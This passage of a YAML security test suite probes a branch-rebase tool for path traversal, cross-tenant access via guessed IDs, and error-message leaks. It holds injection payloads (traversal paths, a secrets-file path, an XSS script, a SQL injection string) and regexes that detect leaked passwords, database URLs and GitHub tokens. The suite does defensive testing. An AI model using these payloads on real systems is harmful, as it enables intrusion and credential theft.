            arguments:
                branch_id: ../../other_tenant_repo/main
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - 422
                - -32602
            result: null
        - case_id: SEC-002-C
          description: Absolute path injection to bypass directory restrictions
          input:
            tool: rebase_branch
            arguments:
                branch_id: /etc/supabase/secrets.conf
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - 422
                - -32602
            error_response_must_not_match_regex:
                - password\s*=\s*['"]?[a-zA-Z0-9+/=]{8,}
                - api[_-]?key\s*[=:]\s*['"]?[a-zA-Z0-9_-]{20,}
            result: null
    - test_id: SEC-003
      name: Cross-Tenant Branch Access via ID Enumeration
      purpose: |
        Tests if the rebase_branch operation properly validates that the branch_id
        belongs to the authenticated user/organization. Inadequate authorization
        checks could allow attackers to rebase branches from other tenants,
        potentially causing data corruption, service disruption, or unauthorized
        access to other customers' code and configurations.
        Impact: HIGH - Cross-tenant data access, privilege escalation, service
        disruption for other tenants.
      prerequisites:
        - description: A valid branch ID from a different tenant/organization obtained via enumeration or social engineering
          variable: OTHER_TENANT_BRANCH_ID
      test_cases:
        - case_id: SEC-003-A
          description: Attempt to rebase branch belonging to another tenant using enumerated UUID
          input:
            tool: rebase_branch
            arguments:
                branch_id: 00000000-0000-0000-0000-000000000001
          expected_output:
            error_present: true
            error_code_one_of:
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - migration.*successful
                - rebase.*complete
            result: null
        - case_id: SEC-003-B
          description: Attempt to access branch using sequential ID guessing
          input:
            tool: rebase_branch
            arguments:
                branch_id: "999999999"
          expected_output:
            error_present: true
            error_code_one_of:
                - 403
                - 404
                - 422
                - -32602
            result: null
        - case_id: SEC-003-C
          description: Verify error messages don't leak branch existence information
          input:
            tool: rebase_branch
            arguments:
                branch_id: ${OTHER_TENANT_BRANCH_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 403
                - 404
            error_response_must_not_match_regex:
                - branch.*exists.*another
                - belong.*organization
                - tenant[_-]?id
                - owner[_-]?id\s*[=:]\s*[a-f0-9-]{36}
            result: null
    - test_id: SEC-004
      name: Information Disclosure in Error Messages
      purpose: |
        Tests if error messages from rebase operations leak sensitive information
        such as internal paths, database connection strings, git credentials,
        environment variables, or stack traces. Information disclosure can help
        attackers understand the system architecture, plan more targeted attacks,
        or directly obtain credentials for further exploitation.
        Impact: MEDIUM - Aids in reconnaissance, potential credential exposure,
        internal architecture disclosure.
      test_cases:
        - case_id: SEC-004-A
          description: Test for stack trace disclosure on malformed branch ID
          input:
            tool: rebase_branch
            arguments:
                branch_id: <script>alert('xss')</script>
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - at [a-zA-Z0-9_]+\.[a-zA-Z0-9_]+\([^)]+:\d+:\d+\)
                - File "[^"]+", line \d+
                - /home/[a-zA-Z0-9_-]+/
                - /var/lib/[a-zA-Z0-9_-]+/
            result: null
        - case_id: SEC-004-B
          description: Test for database connection string exposure in errors
          input:
            tool: rebase_branch
            arguments:
                branch_id: ''' OR ''1''=''1'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - postgres://[^@]+@[^/]+
                - postgresql://[^@]+:[^@]+@
                - DATABASE_URL=.+
                - host=[a-zA-Z0-9.-]+.*port=\d+
            result: null
        - case_id: SEC-004-C
          description: Test for git credential exposure in error responses
          input:
            tool: rebase_branch
            arguments:
                branch_id: nonexistent-branch-xyz123
          expected_output:
            error_present: true
            error_code_one_of:
                - 404
                - 422
                - -32602
            error_response_must_not_match_regex:
                - https://[^:]+:[^@]+@github\.com
                - GIT_TOKEN=.+
                - github_pat_[a-zA-Z0-9_]{82}
                - ghp_[a-zA-Z0-9]{36}
            result: null
